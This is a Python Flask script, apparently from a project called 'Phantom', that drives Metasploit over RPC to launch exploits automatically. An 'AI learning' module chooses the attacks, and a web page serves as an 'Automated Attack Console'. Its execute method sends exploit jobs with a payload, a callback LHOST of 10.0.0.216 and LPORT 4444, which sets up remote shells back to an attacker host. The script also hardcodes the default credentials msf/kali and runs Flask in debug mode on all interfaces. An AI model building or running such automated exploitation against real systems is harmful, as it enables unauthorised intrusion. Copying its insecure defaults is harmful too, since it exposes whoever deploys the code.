#!/usr/bin/env python3
import os
import logging
import msgpack
import requests
from flask import Flask, jsonify, render_template_string
from phantom.ai_learning_module import PenetrationTestingAI
from phantom.automated_attack_system import AutomatedAttackSystem
from phantom.database import Database

# Logging Setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
logger = logging.getLogger(__name__)

class MetasploitProvider:
    """Handles low-level MSF RPC communication."""
    def __init__(self, host="127.0.0.1", port=55553, user="msf", password="kali"):
        self.url = f"http://{host}:{port}/api/"
        self.user = user
        self.password = password
        self.token = None

    def _call(self, method, params):
        try:
            payload = msgpack.packb({"method": method, "params": params})
            headers = {"Content-Type": "binary/message-pack"}
            resp = requests.post(self.url, data=payload, headers=headers, timeout=10)
            return msgpack.unpackb(resp.content, strict_map_key=False)
        except Exception as e:
            logger.error(f"RPC Call failed: {e}")
            return {"error": str(e)}

    def login(self):
        res = self._call("auth.login", [self.user, self.password])
        self.token = res.get("token")
        return self.token is not None

    def execute(self, ip, exploit_name, payload, lhost="10.0.0.216", lport=4444):
        if not self.token and not self.login():
            return False, "Authentication failed"
        
        params = [self.token, "exploit", exploit_name, {
            "RHOSTS": ip,
            "PAYLOAD": payload,
            "LHOST": lhost,
            "LPORT": lport
        }]
        result = self._call("module.execute", params)
        return ("job_id" in result), result.get("error")

# Initialize Systems
app = Flask(__name__)
ai = PenetrationTestingAI("data/knowledge/metasploit_ai_knowledge.json")
msf = MetasploitProvider()

def attack_executor(mac, exploit_name, payload):
    # Logic to resolve MAC to IP would go here
    # Placeholder for target resolution
    target_ip = "127.0.0.1" 
    return msf.execute(target_ip, exploit_name, payload)

attack_system = AutomatedAttackSystem(ai, attack_executor)

@app.route('/')
def api_index():
    return jsonify({
        "status": "online",
        "ai_stats": ai.get_statistics(),
        "endpoints": {
            "/console": "Web UI Interface",
            "/ai/stats": "Current AI learning state"
        }
    })

@app.route('/console')
def console():
    # Returning a truncated version of your UI for brevity in this refactor
    # In production, move this to templates/console.html
    return render_template_string('''
        <html>
        <head><title>Phantom Console</title></head>
        <body style="background:#0a0a0a; color:#00ff00; font-family:monospace;">
            <h1>🎯 Phantom Automated Attack Console</h1>
            <div id="output" style="border:1px solid #00ff00; padding:20px; height:400px; overflow:auto;">
                [SYSTEM] Ready for commands...
            </div>
            <button onclick="alert('Starting scan...')">Scan Network</button>
        </body>
        </html>
    ''')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
